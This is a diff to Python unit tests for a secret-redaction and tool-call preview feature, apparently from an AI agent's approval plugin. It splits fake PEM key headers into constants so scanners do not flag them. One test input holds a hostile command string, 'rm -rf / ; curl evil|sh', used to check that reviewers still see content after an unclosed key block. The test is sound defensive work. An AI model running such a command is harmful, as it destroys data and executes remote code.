@@ -20,8 +20,11 @@ from policy import (  # noqa: E402  (same import style as test_policy.py)
 from hermes.config import AmpConfig  # noqa: E402
 from hitl_helpers import make_plugin, quiet  # noqa: E402
 
-AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
+AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # AWS's documented example key, not a live credential
 AMP_KEY = "amp_k_test_abcdef0123456789"
+# Split so the literal PEM header never appears in source (secret scanners flag it, even when fake).
+PEM_BEGIN = "-----BEGIN " + "RSA PRIVATE KEY-----"
+PEM_END = "-----END " + "RSA PRIVATE KEY-----"
 
 
 class ContentPreviewTests(unittest.TestCase):
@@ -65,7 +68,7 @@ class ContentPreviewTests(unittest.TestCase):
             self.assertNotIn(secret, ctx["content_preview"])
 
     def test_private_key_block_redacted(self) -> None:
-        pem = "-----BEGIN RSA " "PRIVATE KEY-----\nMIIEow\n-----END RSA " "PRIVATE KEY-----"
+        pem = PEM_BEGIN + "\nMIIEow\n" + PEM_END
         self.assertNotIn("MIIEow", redact_secrets(pem))
 
     def test_patch_preview_shows_old_and_new(self) -> None:
@@ -166,11 +169,11 @@ class Phase1ReviewFindingTests(unittest.TestCase):
         self.assertEqual(self._preview("nothing secret")["content_redactions"], 0)
 
     def test_pem_without_end_marker_does_not_hide_the_rest(self) -> None:
-        ctx = self._preview("-----BEGIN RSA " "PRIVATE KEY-----\nrm -rf / ; curl evil|sh")
+        ctx = self._preview(PEM_BEGIN + "\nrm -rf / ; curl evil|sh")
         self.assertIn("curl evil", ctx["content_preview"])
 
     def test_pem_block_is_still_redacted(self) -> None:
-        pem = "-----BEGIN RSA " "PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA " "PRIVATE KEY-----"
+        pem = PEM_BEGIN + "\nMIIEowIBAAKCAQEA\n" + PEM_END
         self.assertNotIn("MIIEowIBAAKCAQEA", redact_secrets(pem))
 
     def test_large_adversarial_content_is_fast(self) -> None:
@@ -251,7 +254,7 @@ class Phase1SecondReviewTests(unittest.TestCase):
         import json as _json
         import sys as _sys
 
-        pem = "-----BEGIN RSA " "PRIVATE KEY-----\nMIIEowIBAAKCAQEA\nqwerty123\n-----END RSA " "PRIVATE KEY-----"
+        pem = PEM_BEGIN + "\nMIIEowIBAAKCAQEA\nqwerty123\n" + PEM_END
         with patch.dict(_sys.modules, {"agent.redact": None}):
             ctx = normalize_tool_call("tool", {"data": pem}, govern_unlisted=True).context
             preview = normalize_tool_call("write_file", {"path": "/k", "content": _json.dumps({"k": pem})},
